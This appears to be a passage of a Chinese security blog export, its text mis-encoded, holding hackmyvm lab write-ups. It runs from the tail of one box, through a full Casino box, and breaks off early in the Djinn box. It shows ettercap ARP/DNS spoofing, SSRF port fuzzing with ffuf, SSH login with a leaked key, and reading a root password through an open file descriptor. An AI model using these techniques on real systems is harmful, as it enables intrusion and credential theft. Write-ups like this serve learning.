<p><strong>æ€è·¯æ˜¯åˆ©ç”¨dnsæ¬ºéª—ï¼Œè®©é¶æœºå‘è‡ªå·±çš„kaliå‘é€è¯·æ±‚ï¼Œè‡ªå·±çš„kaliä¼ªé€ ä¸€ä¸ªattack.shï¼Œè®©é¶æœºè®¿é—®</strong></p>
<p>æ­¥éª¤ï¼š</p>
<p>å…ˆåœ¨ä¿®æ”¹&#x2F;etc&#x2F;ettercap&#x2F;etter.dnsæ–‡ä»¶ï¼Œå¢åŠ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masterddos.hmv A 192.168.64.3</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¼€å§‹dnsæ”»å‡»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ettercap -i eth0 -Tp -M arp:remote -P dns_spoof /192.168.64.92// /192.168.64.1//</span><br></pre></td></tr></table></figure>

<p>åœ¨é¶æœºå»ping masterddos.hmvï¼Œå›å¤çš„ipæ˜¯kaliçš„ipï¼ŒDNSæ¬ºéª—æ‰§è¡ŒæˆåŠŸ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">purple@color:~$ ping masterddos.hmv</span><br><span class="line">ping masterddos.hmv</span><br><span class="line">PING masterddos.hmv (192.168.64.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=1 ttl=64 time=1.49 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=2 ttl=64 time=0.915 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=3 ttl=64 time=0.972 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=4 ttl=64 time=1.08 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=5 ttl=64 time=0.681 ms</span><br></pre></td></tr></table></figure>

<p>æ¥ç€å°±sudo &#x2F;attack_dir&#x2F;ddos.shæ‰§è¡Œè„šæœ¬</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320222448.png" ></p>
<p>æˆåŠŸæ‹¿åˆ°rootçš„shellï¼ŒææƒæˆåŠŸã€‚</p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>ç¬¬ä¸€æ¬¡é‡åˆ°<strong>DNSæ¬ºéª—</strong>ï¼Œå­¦åˆ°äº†ï¼Œé€šè¿‡ftpæ•²é—¨é‚£é‡Œæ€è·¯æ¯”è¾ƒæ¸…å¥‡ï¼Œè¦æ‰“ç ´æƒ¯æ€§æ€ç»´ï¼Œä¸è¦ä¸€çœ‹åˆ°è´¦å·å¯†ç åªæƒ³åˆ°sshçš„ç½‘é¡µï¼Œè¿˜æœ‰ftpï¼å¯æ‰§è¡Œæ–‡ä»¶ä¿®æ”¹ï¼ˆäºŒè¿›åˆ¶æ–¹å‘çš„é­…åŠ›ï¼‰ï¼Œknockå¼€ç«¯å£ï¼ˆæ³¨æ„ç½‘å¡é…ç½®ï¼‰ï¼Œè¿˜æœ‰ä¸€èˆ¬éƒ½æ˜¯å…ˆæ‹¿åˆ°www-dataå†æ‹¿åˆ°å…¶ä»–è´¦æˆ·çš„shellï¼Œè¿™æ¬¡æ˜¯å…ˆæœ‰ä¸ªpinkæ‰æœ‰www-dataã€‚</p>
<p>è¿™ä¹ˆç†ä¸‹æ¥çŸ¥è¯†ç‚¹ä¹Ÿä¸æ˜¯ç‰¹åˆ«å¤šï¼Œä½†æˆ‘å°±è¦æ¶ˆåŒ–å¥½ä¹…ï¼Œè‡ªå·±åšçš„æ—¶å€™æ²¡åŠæ³•æƒ³åˆ°çš„æ€è·¯æ— éå°±æ˜¯å› ä¸ºçŸ¥è¯†é¢ä¸å¤Ÿå¹¿ï¼Œè¿˜æœ‰å°±æ˜¯è„‘å­ä¸å¤Ÿçµæ´»ï¼ˆæ¯”å¦‚æ²¡æƒ³åˆ°æ‹¿è´¦å·å¯†ç ç™»é™†ftpï¼‰ï¼Œè·¯æ¼«æ¼«ã€‚</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>å¤ç›˜</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm casinoå¤ç›˜</title>
    <url>/2024/03/18/hackmyvm-casino%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h4><p>åœ°å€ï¼š<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Casino" >https://hackmyvm.eu/machines/machine.php?vm=Casino<i class="fas fa-external-link-alt"></i></a></p>
<p>éš¾åº¦ï¼šmedium</p>
<p>é¶æœºipï¼š192.168.64.82</p>
<h4 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h4><p>ç«¯å£æ‰«ææ‰«åˆ°22å’Œ80ç«¯å£</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165203.png" ></p>
<p>å…ˆåˆ°80ç«¯å£ï¼Œæœ‰ä¸ªç™»é™†é¡µé¢ï¼Œä¸çŸ¥é“è´¦å·å¯†ç ï¼Œå…ˆæ³¨å†Œä¸€ä¸ªè´¦å·</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165317.png" ></p>
<p>ç™»é™†è¿›å»åæœ‰ä¸ªä¸‰ä¸ªèµŒåšæ¸¸æˆï¼Œèµ·å§‹é‡‘é¢æ˜¯1000$ï¼Œç»è¿‡ä¸€ç•ªæ¢ç´¢ç»“åˆæ‰«åˆ°çš„ç›®å½•ï¼Œæˆ‘éšä¾¿åœ¨çŒœç‚¹æ•°çš„æ¸¸æˆæŠŠé‡‘é¢å…¨éƒ¨è¾“å…‰ï¼Œæ¥ç€ç•Œé¢å°±ç»™æˆ‘è·³è½¬åˆ°ä»¥ä¸‹è¿™ä¸ª</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165533.png" ></p>
<p>æ³¨æ„urlæ˜¯â€<strong>&#x2F;casino&#x2F;explainmepls.php?learnabout&#x3D;en.wikipedia.org&#x2F;wiki&#x2F;Dice</strong>â€œï¼Œç»è¿‡æµ‹è¯•æ²¡åŠæ³•æ–‡ä»¶åŒ…å«æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶ï¼Œä½†æ˜¯?learnabout&#x3D;<a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a> ä¼šè·³è½¬ï¼ŒçŒœæµ‹æ˜¯å­˜åœ¨ssrfæ¼æ´ï¼ŒéªŒè¯ä¸€ä¸‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165739.png" ></p>
<p>ä¼šå‡ºç°æœ€å¼€å§‹çœ‹åˆ°çš„ç™»é™†é¡µé¢ï¼Œæ¥ç€å°±fuzzä¸€ä¸‹å¯¹å†…æœ‰å“ªäº›ç«¯å£å¼€äº†ï¼ˆè®°å¾—å¸¦ä¸Šcookieï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span>; i&lt;=<span class="number">65535</span>; i++)); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span> &gt;&gt; dictionary.txt</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">å…ˆç”Ÿæˆä¸€ä¸ªè„šæœ¬</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w dictionary.txt -u <span class="string">&#x27;http://192.168.64.82/casino/explainmepls.php?learnabout=127.0.0.1:FUZZ&#x27;</span> -fw 284 -b <span class="string">&quot;PHPSPHPSESSID=kd3kcoc7nogvaeqsqktu0ktctb&quot;</span></span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318182217.png" ></p>
<p>æ‰«åˆ°äº†6969ç«¯å£ï¼Œå…ˆè®¿é—®çœ‹çœ‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002002.png" ></p>
<p>æ˜¯æœ‰ä¸œè¥¿çš„ï¼Œæ‰«ä¸€ä¸‹ç›®å½•çœ‹çœ‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u <span class="string">&quot;http://192.168.64.82/casino/explainmepls.php?learnabout=localhost:6969/FUZZ&quot;</span> -b <span class="string">&quot;PHPSESSID=kd3kcoc7nogvaeqsqktu0ktctb&quot;</span> -fw 284</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319004853.png" ></p>
<p>æ‰«åˆ°&#x2F;codebreakersï¼Œ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2000.23.29.png" ></p>
<p>çœ‹åˆ°æºç æœ‰ä¸ªshimmer_rsaï¼Œè®¿é—®ä¹‹åæ„è¯†ä¸€ä¸ªç§é’¥å†…å®¹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002436.png" ></p>
<p>ä¿å­˜ä¹‹ååˆ©ç”¨è¿™ä¸ªæ–‡ä»¶sshç™»é™†æˆåŠŸ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002651.png" ></p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002957.png" ></p>
<p>å¯ä»¥çœ‹åˆ°ç›®å½•ä¸‹æœ‰ä¸ªpassï¼Œæ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œæ˜¯è¦çŒœå¯†ç ï¼Œä¼ åˆ°æœ¬åœ°ç”¨idaåˆ†æçœ‹çœ‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2000.31.48.png"  alt="mainå‡½æ•°"></p>
<p>ç‚¹å‡»çœ‹ä¸€ä¸‹ç¬¬ä¸€ä¸ªå¯†ç çš„checkpasswdå‡½æ•°</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319003547.png" ></p>
<p>æœ‰å¾ˆå¤šä¸ªè¡¨è¾¾å¼å»åŒ¹é…ï¼Œæˆ‘æƒ³åˆ°ç”¨z3å»è¿ç®—å‡ºç»“æœ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»º26ä¸ªå˜é‡ï¼Œæ¯ä¸ªå˜é‡è¡¨ç¤ºå­—ç¬¦ä¸²ä¸­å¯¹åº”ä½ç½®çš„å­—ç¬¦</span></span><br><span class="line">a = [Int(<span class="string">&#x27;a[%d]&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ª Z3 solver å®ä¾‹</span></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ·»åŠ å­—ç¬¦ä¸²é•¿åº¦ç­‰äº 26 çš„çº¦æŸ</span></span><br><span class="line">solver.add(<span class="built_in">len</span>(a) == <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ·»åŠ å„ç§æ¡ä»¶çº¦æŸ</span></span><br><span class="line">solver.add(a[<span class="number">0</span>] - a[<span class="number">20</span>] == -<span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">1</span>] + a[<span class="number">6</span>] == <span class="number">208</span>)</span><br><span class="line">solver.add(a[<span class="number">2</span>] - a[<span class="number">4</span>] == <span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">3</span>] - a[<span class="number">14</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">4</span>] * a[<span class="number">25</span>] == <span class="number">10100</span>)</span><br><span class="line">solver.add(a[<span class="number">5</span>] + a[<span class="number">17</span>] == <span class="number">219</span>)</span><br><span class="line">solver.add(a[<span class="number">6</span>] - a[<span class="number">10</span>] == -<span class="number">11</span>)</span><br><span class="line">solver.add(a[<span class="number">7</span>] - a[<span class="number">20</span>] == -<span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">8</span>] * a[<span class="number">17</span>] == <span class="number">11845</span>)</span><br><span class="line">solver.add(a[<span class="number">9</span>] - a[<span class="number">18</span>] == -<span class="number">7</span>)</span><br><span class="line">solver.add(a[<span class="number">10</span>] - a[<span class="number">24</span>] == <span class="number">1</span>)</span><br><span class="line">solver.add(a[<span class="number">11</span>] * a[<span class="number">4</span>] == <span class="number">9797</span>)</span><br><span class="line">solver.add(a[<span class="number">12</span>] - a[<span class="number">3</span>] == <span class="number">3</span>)</span><br><span class="line">solver.add(a[<span class="number">13</span>] * a[<span class="number">11</span>] == <span class="number">11252</span>)</span><br><span class="line">solver.add(a[<span class="number">14</span>] - a[<span class="number">13</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">15</span>] == a[<span class="number">23</span>])</span><br><span class="line">solver.add(a[<span class="number">16</span>] - a[<span class="number">8</span>] == -<span class="number">5</span>)</span><br><span class="line">solver.add(a[<span class="number">17</span>] * a[<span class="number">7</span>] == <span class="number">10815</span>)</span><br><span class="line">solver.add(a[<span class="number">18</span>] - a[<span class="number">14</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">19</span>] - a[<span class="number">0</span>] == -<span class="number">8</span>)</span><br><span class="line">solver.add(a[<span class="number">20</span>] - a[<span class="number">23</span>] == <span class="number">4</span>)</span><br><span class="line">solver.add(a[<span class="number">21</span>] + a[<span class="number">7</span>] == <span class="number">220</span>)</span><br><span class="line">solver.add(a[<span class="number">22</span>] - a[<span class="number">1</span>] == <span class="number">15</span>)</span><br><span class="line">solver.add(a[<span class="number">23</span>] == a[<span class="number">15</span>])</span><br><span class="line">solver.add(a[<span class="number">24</span>] * a[<span class="number">2</span>] == <span class="number">12654</span>)</span><br><span class="line">solver.add(a[<span class="number">25</span>] - a[<span class="number">12</span>] == -<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥çº¦æŸæ˜¯å¦æ»¡è¶³</span></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(model[a[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ»¡è¶³æ¡ä»¶çš„å­—ç¬¦ä¸²ä¸ºï¼š&quot;</span>, result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ‰¾ä¸åˆ°æ»¡è¶³æ¡ä»¶çš„å­—ç¬¦ä¸²&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºæ¥çš„ç»“æœæ˜¯â€œæ»¡è¶³æ¡ä»¶çš„å­—ç¬¦ä¸²ä¸ºï¼š ihopethisisastrongpasswordâ€</p>
<p>è¿™æ ·å°±æ‹¿åˆ°ç¬¬ä¸€ä¸ªå¯†ç äº†ï¼Œä¾æ¬¡è¾“å…¥ä¸¤ä¸ªå¯†ç æ‹¿åˆ°ä¸€ä¸ª&#x2F;bin&#x2F;shï¼Œæ³¨æ„è¿™é‡Œçš„ç‚¹æ˜¯</p>
<p><strong>ç¨‹åºä¸­openäº†&#x2F;opt&#x2F;root.passï¼Œä½†æ˜¯æ²¡æœ‰closeï¼Œå¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ç›¸å…³çš„è¿›ç¨‹</strong></p>
<p>â€œåœ¨linuxä¸­ï¼Œæ¯ä¸ªè¿›ç¨‹çš„ <code>/proc/&lt;PID&gt;/fd</code> ç›®å½•åŒ…å«äº†è¯¥è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦çš„ç¬¦å·é“¾æ¥ã€‚ä½ å¯ä»¥é€šè¿‡æŸ¥çœ‹è¯¥ç›®å½•æ¥äº†è§£è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦çš„ç›¸å…³ä¿¡æ¯ï¼Œå¯ä»¥ç”¨<code>ls -l /proc/&lt;PID&gt;/fd</code>æŸ¥çœ‹ï¼Œè€Œä¸€ä¸ªè¿›ç¨‹çš„PIDå¯ä»¥ç”¨<code>lsof /path/to/your/file</code>æŸ¥çœ‹â€</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ lsof /opt/root.pass</span><br><span class="line">COMMAND PID    USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME</span><br><span class="line">sh      768 shimmer    3r   REG    8,1       15 522246 /opt/root.pass</span><br><span class="line">$ <span class="built_in">ls</span> -l /proc/768/fd</span><br><span class="line">total 0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 0 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 1 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 10 -&gt; /dev/tty</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 2 -&gt; /dev/pts/0</span><br><span class="line">lr-x------ 1 shimmer shimmer 64 mar 18 17:43 3 -&gt; /opt/root.pass</span><br><span class="line">$ <span class="built_in">cd</span> /proc/768/fd</span><br><span class="line">$ <span class="built_in">cat</span> &lt;&amp;3</span><br><span class="line">masteradmin420</span><br></pre></td></tr></table></figure>

<p>ä¸€é¡¿æ“ä½œï¼Œå°±æ‹¿åˆ°äº†rootçš„å¯†ç ï¼Œsuç™»é™†ï¼ŒææƒæˆåŠŸ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319004826.png" ></p>
<h4 id="webä»£ç å¤ç›˜"><a href="#webä»£ç å¤ç›˜" class="headerlink" title="webä»£ç å¤ç›˜"></a>webä»£ç å¤ç›˜</h4><p>åœ¨games.phpæ‰¾åˆ°è·³è½¬explainmepls.phpçš„ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$money</span> == <span class="number">0</span> &amp;&amp; <span class="variable">$game</span> != <span class="number">8</span>) &#123; <span class="comment">// è¿™é‡Œå°±æ˜¯éœ€è¦money=0ï¼Œæ‰€ä»¥è¦æŠŠé’±è¾“å…‰</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$game</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Shell_game&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Russian_roulette&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Dice&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">include_once</span> <span class="string">&quot;./games/error.php&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: explainmepls.php?learnabout=&#x27;</span> . <span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2001.00.46.png" ></p>
<p>è§¦å‘ssrfæ¼æ´çš„åœ°æ–¹ï¼Œâ€œ<code>file_get_contents()</code> å‡½æ•°ç”¨äºä»æŒ‡å®šçš„ URL ä¸­è·å–å†…å®¹å¹¶å°†å…¶è¾“å‡ºã€‚å¯ä»¥é€šè¿‡æ§åˆ¶ <code>$learnabout</code> å˜é‡æ¥æ„é€ ä»»æ„ URLâ€</p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>wpè¯´passé‚£å—ç¬¬ä¸€ä¸ªå¯†ç å¯ç”¨angræ¨¡å—è§£å†³ï¼Œæˆ‘è‡ªå·±çœ‹çš„æ—¶å€™å…ˆæƒ³åˆ°çš„æ˜¯z3ï¼Œæœ€åä¹Ÿè§£å‡ºæ¥äº†ï¼Œåç»­è¦å­¦ä¸€ä¸‹</p>
<p>æœ€å¼€å§‹é‚£ä¸ªèµŒåšæ¸¸æˆä¹Ÿæ˜¯ç»è¿‡ä¸€ç•ªæ¢ç´¢æ‰æ‰¾åˆ°ssrfé‚£ä¸ªç‚¹ï¼Œè€Œä¸”åˆšæ‰¾åˆ°çš„æ—¶å€™è¿˜ä»¥ä¸ºæ˜¯æ–‡ä»¶åŒ…å«ï¼ˆçŸ¥è¯†ä¸å¤Ÿç‰¢å›ºï¼‰å…³äºssrfåˆ©ç”¨ï¼Œç«¯å£çš„fuzzä¹Ÿéœ€è¦è®°ä½ï¼Œè¿˜æœ‰å°±æ˜¯æœ€åæ–‡ä»¶æ‰“å¼€é‚£å—ï¼Œè¿˜èƒ½é€šè¿‡lsofæ‰¾åˆ°ç›¸å…³è¿›ç¨‹ï¼Œæ„Ÿè§‰è¿™ä¸ªæ€è·¯ä»¥åè¿˜ä¼šé‡åˆ°ï¼Œä¹Ÿç®—æ˜¯å¤šå­¦ä¹ åˆ°linuxæœ‰å…³çš„çŸ¥è¯†äº†ï¼Œæ€»çš„æ¥è¯´è¿™ä¸ªé¶åœºå¾ˆå€¼å¾—å­¦ä¹ å›é¡¾ã€‚</p>
<p>æ‰€éœ€çŸ¥è¯†ç‚¹ï¼šssrfæ¼æ´åˆ©ç”¨ï¼Œæ–‡ä»¶é€†å‘ï¼Œz3æ±‚è§£ï¼Œlinuxè¿›ç¨‹å·æŸ¥æ‰¾ï¼Œç«¯å£æ‰«æ</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>å¤ç›˜</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm djinnå¤ç›˜</title>
    <url>/2024/03/18/hackmyvm-djinn%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h4><p>åœ°å€ï¼š<a class="link"   href="https://hackmyvm.eu/machines/?v=djin" >https://hackmyvm.eu/machines/?v=djin<i class="fas fa-external-link-alt"></i></a></p>
<p>éš¾åº¦ï¼šeasy</p>
<h4 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h4><p>ç«¯å£æ‰«æï¼Œæ‰«åˆ°21ï¼Œ1337ï¼Œ7331å¼€æ”¾ï¼Œå…ˆç”¨anonymousä½œä¸ºè´¦å·å¯†ç ç™»é™†21å·ç«¯å£ï¼Œæœ‰ä¸‰ä¸ªtxtæ–‡ä»¶ï¼Œä¸‹è½½æ¥çœ‹çœ‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318105541.png" ></p>
<p>gameé‡Œé¢è¯´1337ç«¯å£æœ‰ä¸ªgameï¼Œncè¿æ¥ä¸€ä¸‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318105737.png" ></p>
<p>æ˜¯ä¸ªè®¡ç®—æ¸¸æˆï¼Œéœ€è¦ç®—å¯¹ä¸€åƒæ¬¡ï¼Œè¿™ç§å°±éœ€è¦å†™ä¸ªè„šæœ¬è§£å†³äº†ï¼ˆä»¥ä¸‹è„šæœ¬æ˜¯å‚è€ƒwpçš„ï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">c = pwn.remote(<span class="string">&#x27;192.168.64.80&#x27;</span>, <span class="string">&#x27;1337&#x27;</span>) <span class="comment"># å»ºç«‹ä¸€ä¸ªè¿œç¨‹è”æœº</span></span><br><span class="line">c.recvuntil(<span class="string">&#x27;gift.\n&#x27;</span>) <span class="comment"># æ¥æ”¶è¿æ¥ä¸­çš„æ•°æ®ï¼Œç›´åˆ°é‡åˆ°å­—ç¬¦ä¸² &#x27;gift.\n&#x27; ä¸ºæ­¢</span></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">1001</span>: <span class="comment"># åš1000æ¬¡å¾ªç¯</span></span><br><span class="line">   count += <span class="number">1</span></span><br><span class="line">   data = c.recvuntil(<span class="string">b&quot;)&quot;</span>).decode()</span><br><span class="line">   c.recv() <span class="comment"># æ¥æ”¶è¿æ¥ä¸­çš„æ•°æ®ï¼Œä½†ä¸åšä»»ä½•å¤„ç†ï¼Œç”¨äºæ¸…ç©ºç¼“å†²åŒº</span></span><br><span class="line">   <span class="built_in">print</span>(data)</span><br><span class="line">   num1, num2, todo = <span class="built_in">int</span>(data[<span class="number">1</span>]), <span class="built_in">int</span>(data[<span class="number">9</span>]), data[<span class="number">5</span>]</span><br><span class="line">   <span class="keyword">if</span> todo == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">      answer= num1 + num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">      answer= num1 - num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">      answer= num1 * num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">      answer= num1 / num2</span><br><span class="line">   c.send((<span class="built_in">str</span>(answer) + <span class="string">&quot;\n\r&quot;</span>).encode())</span><br><span class="line">   <span class="keyword">if</span> count &gt; <span class="number">998</span>: <span class="comment"># æ‰“å°æœ€åå‡ æ¬¡çš„è¯¦ç»†ä¿¡æ¯</span></span><br><span class="line">        <span class="built_in">print</span>(answer, count)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.recv().decode())</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110431.png" ></p>
<p>è·‘å®Œè„šæœ¬æœ€åç»™äº†ä¸‰ä¸ªæ•°å­—ï¼ŒçŒœæµ‹æ˜¯æ•²é—¨ï¼Œæ­¤æ—¶22ç«¯å£æ˜¯å…³ç€çš„</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110523.png" ></p>
<p>æŒ‰é¡ºåºæ•²é—¨åï¼Œ22å·ç«¯å£æ‰“å¼€äº†</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110607.png" ></p>
<p>æ¥ç€æˆ‘æƒ³ç”¨åˆšåˆšæ‹¿åˆ°çš„â€œnitu:81299â€â€nitish81299â€å°è¯•ç™»é™†sshï¼Œéƒ½æ²¡æœ‰ç”¨ï¼Œè¿™ä¸ªæ—¶å€™æƒ³åˆ°ä¹‹å‰æœ‰ä¸ª7331ç«¯å£è¿˜æ²¡çœ‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2012.07.20.png" ></p>
<p>å…ˆæ‰«ç›®å½•ï¼Œç”¨äº†ä¸€ä¸ªå¤§ä¸€ç‚¹çš„å­—å…¸åæ‰«åˆ°æœ‰&#x2F;wish &#x2F;genie</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112555.png" ></p>
<p>è®¿é—®&#x2F;wishï¼Œæœ‰ä¸ªå¯ä»¥executeçš„ï¼Œè¾“å…¥idè¯•è¯•</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318111003.png" ></p>
<p>è·³è½¬åˆ°äº†genieï¼Œæ³¨æ„urlæœ‰å‡ºç°www-dataï¼Œè¯´æ˜æ˜¯æ‰§è¡ŒæˆåŠŸçš„</p>
